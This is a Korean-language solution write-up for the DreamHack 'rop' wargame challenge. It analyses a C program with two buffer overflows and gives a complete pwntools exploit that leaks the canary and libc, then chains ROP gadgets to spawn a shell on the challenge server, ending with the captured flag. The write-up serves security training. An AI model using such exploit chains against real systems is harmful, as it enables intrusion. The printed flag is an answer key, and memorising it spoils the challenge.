# [DreamHack] rop

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Exploit Tech: Return Oriented Programming에서 실습하는 문제입니다.
>
> Release: [rop.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8547674/rop.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/159821270-dee0d311-3a7e-4e6a-80e5-758a575ae0a5.png)

## Analysis

```c
int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Leak canary
  puts("[1] Leak Canary");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Do ROP
  puts("[2] Input ROP payload");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```

`read(0, buf, 0x100)`로 두 번의 BOF가 발생한다. 첫 번째 BOF에서 canary를 leak하고, 두 번째 BOF에서 `main()`의 return address를 덮어 ROP를 수행할 수 있다.

## Exploit

### Leak canary

```python
# leak canary

sa('Buf: ', 'a' * 0x39)
r.recvuntil('Buf: ' + 'a' * 0x39)
canary = u64(r.recvn(7).rjust(8, b'\x00'))
```

### Leak libc

ROP로 `puts(GOT)`를 호출하여 libc 주소를 leak할 수 있다. 그리고 나서 다시 `main()`으로 돌아가 `system("/bin/sh")`을 호출하면 셸을 획득할 수 있다.

```python
# leak libc

payload = b'a' * 0x38 # dummy
payload += p64(canary) # canary
payload += b'a' * 0x8 # sfp
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)

sa('Buf: ', payload)
puts = u64(r.recvline()[:-1].ljust(8, b'\x00')) # puts()
log.info('puts: ' + hex(puts))
```

`puts()`의 오프셋을 libc database에 넣어서 libc 버전을 알아낼 수 있고, `system()` 함수와 `"/bin/sh"` 문자열의 주소도 구할 수 있다.

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 20515: Done
[*] puts: 0x7f358e4f1aa0
```

![image](https://user-images.githubusercontent.com/102066383/159828980-cf30ddf9-7481-44b6-bb6e-17f9d60b45a4.png)

### Return to main / Call system("/bin/sh")

```python
# call system("/bin/sh")

sa('Buf: ', 'a')
r.recvline()

payload = b'a' * 0x38 # dummy
payload += p64(canary) # canary
payload += b'a' * 0x8 # sfp
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

sa('Buf: ', payload)
```

### Full exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/rop')
    puts_offset = 0x80970
    system_offset = 0x4f420
    binsh_offset = 0x1b3d88
else:
    r = remote('host1.dreamhack.games', 20626)
    puts_offset = 0x80aa0
    system_offset = 0x4f550
    binsh_offset = 0x1b3e1a

sa = r.sendafter

pop_rdi = 0x4007f3  # pop rdi; ret
ret = 0x40055e  # ret gadget
puts_plt = 0x400570  # PLT of puts()
puts_got = 0x601018  # GOT of puts()
main = 0x4006a7  # main()


# leak canary

sa('Buf: ', 'a' * 0x39)
r.recvuntil('Buf: ' + 'a' * 0x39)
canary = u64(r.recvn(7).rjust(8, b'\x00'))


# leak libc

payload = b'a' * 0x38  # dummy
payload += p64(canary)  # canary
payload += b'a' * 0x8  # sfp
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)  # return to main

sa('Buf: ', payload)
puts = u64(r.recvline()[:-1].ljust(8, b'\x00'))  # puts()
libc = puts - puts_offset  # libc base
system = libc + system_offset  # system()
binsh = libc + binsh_offset


# call system("/bin/sh")

sa('Buf: ', 'a')
r.recvline()

payload = b'a' * 0x38  # dummy
payload += p64(canary)  # canary
payload += b'a' * 0x8  # sfp
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

sa('Buf: ', payload)


r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 20626: Done
[*] Switching to interactive mode
$ cat flag
DH{68b82d23a30015c732688c89bd03d401}
```
